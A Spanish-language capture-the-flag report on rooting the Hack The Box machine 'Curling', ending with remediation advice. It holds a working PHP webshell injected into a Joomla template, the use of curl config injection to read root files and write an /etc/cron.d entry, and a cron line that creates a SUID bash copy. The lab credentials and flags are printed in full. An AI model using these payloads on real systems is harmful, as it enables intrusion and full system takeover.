# REPORTE DETALLADO DE EXPLOTACIÓN - MÁQUINA CURLING (Hack The Box)

## Resumen Ejecutivo

| Campo | Valor |
|-------|-------|
| **Objetivo** | Curling (10.129.79.93) |
| **SO / Stack** | Ubuntu (kernel 4.x), Apache httpd 2.4.29, OpenSSH 7.6p1 |
| **Aplicación** | Joomla! 3.8.8 (May 2018) + MySQL (BBDD `Joombla`, prefijo `eslfu_`) |
| **Vulnerabilidad Inicial** | Credencial admin en `/secret.txt` (base64) → Gestor de Plantillas → RCE |
| **Usuario obtenido** | `www-data` (webshell) → `floris` (SSH) |
| **Escalada** | Inyección de opciones en job root de `curl --config` → escritura arbitraria → cron → SUID bash |
| **Privilegio Obtenido** | **ROOT (uid=0 / euid=0)** |
| **Flags Obtenidas** | user.txt ✅ root.txt ✅ |

**Flags:**

| Flag | Valor | Archivo |
|------|-------|---------|
| USER | `9abd6ac7f52bdd66467a7f2662c79707` | `/home/floris/user.txt` (640 floris:floris) |
| ROOT | `146b8e2d3ad4652e6d2ba3112b1388b2` | `/root/root.txt` (600 root:root) |

**Credenciales encontradas:**

| Servicio | Usuario : Contraseña | Origen |
|---|---|---|
| Joomla `/administrator` (3.8.8) | `floris : Curling2018!` | `GET /secret.txt` → base64 `Q3VybGluZzIwMTgh` |
| SSH :22 (OpenSSH 7.6p1) | `floris : 5d<wdCbdZu)\|hChXll` | `/home/floris/password_backup` (hexdump → bzip2→gzip→gzip→bzip2→tar) |
| MySQL (BBDD `Joombla`) | `floris : mYsQ!P4ssw0rd$yea!` | `/var/www/html/configuration.php` (solo BD, no sistema) |
| Identidad web | `www-data (UID 33)` | Webshell en plantilla |

---

## Fase 0: Estado previo y notas

La explotación ya estaba empezada; solo existía `/home/kali/HTB/curling/pass.txt`:

```
decode con cyberchef: Q3VybGluZzIwMTgh = Curling2018! contraseña para Floris
floris user's password 5d<wdCbdZu)|hChXll
```

> ⚠️ Corrección de la nota previa: la contraseña base64 **no** sale de `configuration.php`, sino de **`/secret.txt`** (17 bytes, en la raíz web). `configuration.php` contiene la contraseña de MySQL.

La user flag no estaba guardada en ningún sitio → se recuperó repitiendo el camino.

---

## Fase 1: Reconocimiento

```bash
$ nmap -sCV -p- -T4 -oA /home/kali/HTB/curling/nmap 10.129.79.93
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
```

```bash
$ curl -sI http://10.129.79.93/
Set-Cookie: c0548020854924e0aecd05ed9f5b672b=...        # session cookie Joomla
$ curl -s http://10.129.79.93/ | grep -i description
<meta name="description" content="best curling site on the planet!">
```

**Versión del CMS:**

```bash
$ curl .../administrator/manifests/files/joomla.xml   -> <name>files_joomla</name> <version>3.8.8</version>
$ curl .../language/en-GB/en-GB.xml                   -> version 3.8.8 (May 2018)
```

**Fichero clave (la credencial estaba a la vista):**

```bash
$ curl -s http://10.129.79.93/secret.txt      # 200, 17 bytes
Q3VybGluZzIwMTgh
$ echo Q3VybGluZzIwMTgh | base64 -d
Curling2018!
```

---

## Fase 2: Autenticación en el backend

Formulario `/administrator/index.php` con token CSRF (campo oculto con nombre aleatorio):

```bash
POST /administrator/index.php
username=floris&passwd=Curling2018!&option=com_login&task=login&return=aW5kZXgucGhw&<token>=1
```

Resultados:

```
[floris : Curling2018!]  SUCCESS (len 28801, com_cpanel)
[admin  : Curling2018!]  FAIL (len 5403)
[root/curling/super]     FAIL
```

Título del backend: *"Templates: Customise (Protostar) - **Cewl Curling site!** - Administration"* — el nombre de usuario del admin es **`floris`**, no `admin`.

---

## Fase 3: Explotación → webshell (Gestor de Plantillas)

El editor de plantillas de Joomla (`com_templates`) permite modificar el PHP de la plantilla.

**Detalle crítico:** el parámetro `file` es base64 **sin padding y relativo a la raíz de la plantilla**:

```bash
file=L2luZGV4LnBocA   # = "/index.php"   (NO "/protostar/index.php" -> textarea vacía)
```

```bash
GET  .../administrator/index.php?option=com_templates&view=template&id=506&file=L2luZGV4LnBocA
POST .../administrator/index.php?option=com_templates&view=template&id=506&file=L2luZGV4LnBocA
     jform[source]=<payload + código original>&task=template.save&id=506
-> alerta: "File saved."
```

Payload inyectado **encima** de `defined('_JEXEC') or die;` (por eso el acceso directo funciona):

```php
<?php if(isset($_REQUEST["cmd"])){header("Content-Type: text/plain");echo "[SHELL]\n";system($_REQUEST["cmd"]);exit;} ?>
```

Comprobación (no quedaba webshell de la sesión previa: `GET .../index.php?cmd=id` → 200/0 bytes):

```bash
$ curl -G --data-urlencode "cmd=id" http://10.129.79.93/templates/protostar/index.php
[SHELL]
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**RCE como `www-data`.**

---

## Fase 4: Post-explotación www-data → contraseña de floris

```bash
$ grep password /var/www/html/configuration.php
public $password = 'mYsQ!P4ssw0rd$yea!';     # MySQL
public $user='floris'; public $db='Joombla'; public $prefix='eslfu_';

$ ls -la /home/floris/
-rw-r--r--  password_backup  (1076)    <-- hexdump ASCII (file: "ASCII text")
-rw-r-----  user.txt          (33)      <-- NO legible como www-data (640 floris:floris)
drwxr-x---  admin-area/                <-- root:floris, legible/ejecutable por floris
```

### 4.1 Desanidado de `/home/floris/password_backup`

Cabecera `BZh91AY&SY` → es un **hexdump de xxd** de un binario bzip2:

```
xxd-hexdump → binario (244 B) → bzip2 -d → gzip "password" (173 B)
            → gzip -d → bzip2 (141 B) → bzip2 -d → tar (10240 B) → password.txt
```

```
password.txt = 5d<wdCbdZu)|hChXll
```

---

## Fase 5: USER FLAG

```bash
paramiko: floris : 5d<wdCbdZu)|hChXll  ->  uid=1000(floris) gid=1004(floris)
$ cat /home/floris/user.txt
9abd6ac7f52bdd66467a7f2662c79707
```

---

## Fase 6: Enumeración de escalada

```
sudo -n -l   -> "Sorry, user floris may not run sudo on curling."
groups       -> solo floris (1004)
SUID         -> solo estándar (sudo, su, pkexec, mount, at, newuidmap...)
/opt         -> vacío
/etc/cron.*  -> sin nada propio; crontab de root ilegible
```

**Hallazgo clave** — con `find -newermt` se detecta que el job de root reescribe ficheros **cada minuto**:

```bash
$ find /home/floris/admin-area -newermt ... -ls
# report  se reescribe en el segundo :01
# input   se reescribe en el segundo :02 (se resetea a la plantilla)

$ cat /home/floris/admin-area/input
url = "http://127.0.0.1"
$ cat /home/floris/admin-area/report
HTML de la home de Joomla (14236 B)
# como root: /root/default.txt -> url = "http://127.0.0.1"  (plantilla del job)
```

---

## Fase 7: Vulnerabilidad del job de root — inyección en `curl --config`

**Prueba 1 — control de URL** (tick 17:27:01):

```
input: url = "file:///etc/hostname"   ->  report = "curling" (8 B)
```

El `input` se resetea a la plantilla en el segundo **:02** ⇒ ventana de escritura entre **:02 y :01**.

**Prueba 2 — inyección de opciones curl** (tick 17:30:01):

```
input:
  url = "http://127.0.0.1/$(touch /tmp/cmdtest)"
  output = "/tmp/cfgtest"
resultado:
  -rw-r--r-- 1 root root 322 /tmp/cfgtest      <-- CREADO por root  ✔ config injection
  /tmp/cmdcmdtest NO existe                     <-- NO hay inyección de shell
```

⇒ El job ejecuta **`curl --config/-K input ...`**: el fichero `input` es un **fichero de configuración de curl**, lo que permite (a) URLs arbitrarias (`file://`) y (b) **opciones curl arbitrarias → escritura de ficheros como root** (`output`).

### 7.1 ROOT FLAG vía `file://` (tick 17:32:01)

```
input: url = "file:///root/root.txt"
-> report (33 B): 146b8e2d3ad4652e6d2ba3112b1388b2
```

---

## Fase 8: Escritura arbitraria → cron → root shell

```bash
# 1) payload servido por el propio Apache (webshell ya controlada)
printf '* * * * * root /bin/bash -c "cp /bin/bash /tmp/.r00t; chmod 4755 /tmp/.r00t"\n' \
  > /var/www/html/templates/protostar/pwn.txt      # verificado por HTTP

# 2) en la ventana :02 -> :01 (tick 17:34:01)
input:
  url = "http://127.0.0.1/templates/protostar/pwn.txt"
  output = "/etc/cron.d/zzpwn"
-> -rw-r--r-- 1 root root 77  /etc/cron.d/zzpwn

# 3) cron (17:35)
-> -rwsr-xr-x 1 root root 1113504  /tmp/.r00t

# 4) root
$ /tmp/.r00t -p -c "id; cat /root/root.txt"
uid=1000(floris) gid=1004(floris) euid=0(root) groups=1004(floris)
146b8e2d3ad4652e6d2ba3112b1388b2
```

---

## Fase 9: Limpieza (hecha y verificada)

- `templates/protostar/index.php` **restaurado** al original → `File saved.`, sin webshell (`GET ?cmd=id` → 200/0 bytes, sitio 200 OK).
- `pwn.txt` eliminado (HTTP 404).
- `/etc/cron.d/zzpwn`, `/tmp/.r00t`, `/tmp/cfgtest` eliminados.
- `admin-area/{input,report}` en su estado por defecto.
- **Kali limpio:** sin listeners (`ss -ltnp` vacío) ni procesos ffuf/gobuster/nc/http.server.

---

## Vectores fallidos / notas

| # | Vector | Motivo |
|---|--------|--------|
| 1 | Nota previa: "contraseña en `configuration.php`" | Incorrecta → la pass admin está en **`/secret.txt`**; `configuration.php` solo tiene la pass de MySQL |
| 2 | Login con `admin/Curling2018!` (y root/curling/super) | El usuario real del backend es **`floris`** |
| 3 | `file=/protostar/index.php` en el editor de plantillas | textarea vacía → `file` es relativo a la raíz de la plantilla, base64 sin padding |
| 4 | `user.txt` como www-data | 640 floris:floris → hace falta SSH como floris |
| 5 | `sudo -l`, SUID, cron de usuario, `/opt` | sin vectores directos → vector real: job de root en `admin-area` |
| 6 | Inyección de shell `$(...)` en la URL | el job no pasa por shell → solo inyección de **opciones curl** (`--config`) |
| 7 | wordlists (ffuf/gobuster comunes) | no instaladas → enum manual (`secret.txt` encontrado en lista manual) |

---

## Obstáculos resueltos

1. **Contenido previo no documentado** → reconstrucción repitiendo recon + login + webshell + recuperación de ambas flags.
2. **user.txt ilegible desde www-data** → cadena de descompresión de `password_backup` (xxd → bzip2 → gzip → gzip → bzip2 → tar) → SSH como floris.
3. **Cron de root no editable** → descubrir que `admin-area/input` es un `--config` de curl → opciones `url`/`output` = lectura/escritura arbitraria como root (ventana :02→:01).
4. **Sin inyección de shell** → en vez de comandos, se usa `output` para escribir `/etc/cron.d/` y `url` para leer `file:///root/root.txt`.

---

## MITRE ATT&CK Mapping

| Táctica | Técnica | ID |
|---------|---------|-----|
| Reconocimiento | Active Scanning: port scan | T1046 |
| Reconocimiento | Gather Victim Host Information: Software | T1592.004 |
| Acceso Initial | Valid Accounts: Default Accounts (credencial en fichero web) | T1078.004 |
| Acceso Initial | Exploitation of Remote Services | T1210 |
| Ejecución | Command and Scripting Interpreter: PHP | T1059.006 |
| Persistencia | Server Software Component: Web Shell | T1505.003 |
| Credenciales | Unsecured Credentials: Credentials In Files | T1552.001 |
| Credenciales | Unsecured Credentials: Password Stores (hexdump anidado) | T1552.001 |
| Escalada | Scheduled Task/Job: Cron (abuso de job root) | T1053.003 |
| Escalada | Abuse Elevation Control Mechanism: sudo/SUID | T1548.003 |
| Acceso a datos | Data from Local System (`file://` de root.txt) | T1005 |

---

## Hallazgos y Remediación

| # | Hallazgo | Severidad | Evidencia | Remediación |
|---|----------|-----------|-----------|-------------|
| 1 | Credencial admin expuesta en `/secret.txt` (base64) | **CRÍTICO** | `GET /secret.txt` → `Q3VybGluZzIwMTgh` | Eliminar el fichero; no exponer credenciales en la raíz web; rotar |
| 2 | RCE vía Gestor de Plantillas de Joomla (admin logueado) | **CRÍTICO** | PHP en `templates/protostar/index.php` → `uid=33(www-data)` | Restringir edición de plantillas, 2FA, cambiar pass admin, actualizar Joomla (3.8.8 obsoleta) |
| 3 | Job de root ejecuta `curl --config` con fichero escribible por `floris` | **CRÍTICO** | `input` con `url/output` arbitrarios → cron SUID | No correr curl con `--config` de ruta escribible por usuarios; ficheros root-only; validar URL |
| 4 | Credenciales redundantes: misma pass (o variantes) para Joomla/MySQL/SSH; `password_backup` anidado en home | **ALTO** | `password_backup`, `configuration.php` | No guardar backups de passwords; contraseñas únicas por servicio |
| 5 | Joomla 3.8.8 / Apache 2.4.29 / OpenSSH 7.6 obsoletos | **MEDIO** | nmap, joomla.xml | Actualizar SO y aplicación |
| 6 | `admin-area` legible/ejecutable por `floris` (grupo floris) | **BAJO** | `ls -la /home/floris` | Permisos mínimos en directorios del job |

---

## Éxito del Ataque

| Objetivo | Estado |
|----------|--------|
| Acceso al sistema | Completado (www-data → floris) |
| Privilegio Root | Obtenido (euid=0) |
| user.txt | `9abd6ac7f52bdd66467a7f2662c79707` |
| root.txt | `146b8e2d3ad4652e6d2ba3112b1388b2` |
| Limpieza | Completada (webshell restaurada, cron/SUID/listeners borrados) |

---

## Archivos del caso

| Archivo | Contenido |
|---------|-----------|
| `/home/kali/HTB/informes/informe_curling.md` | Este informe |
| `/home/kali/HTB/curling/curling_flags.txt` | Flags + credenciales + cadena de ataque |
| `/home/kali/HTB/curling/nmap.{nmap,gnmap,xml}` | Escaneo `nmap -sCV -p- -T4` |
| `/home/kali/HTB/curling/secret.txt` | Credencial base64 del admin |
| `/home/kali/HTB/curling/pass.txt` | Notas previas (corregidas en este informe) |
| `/home/kali/HTB/curling/index.html` | Home capturada |
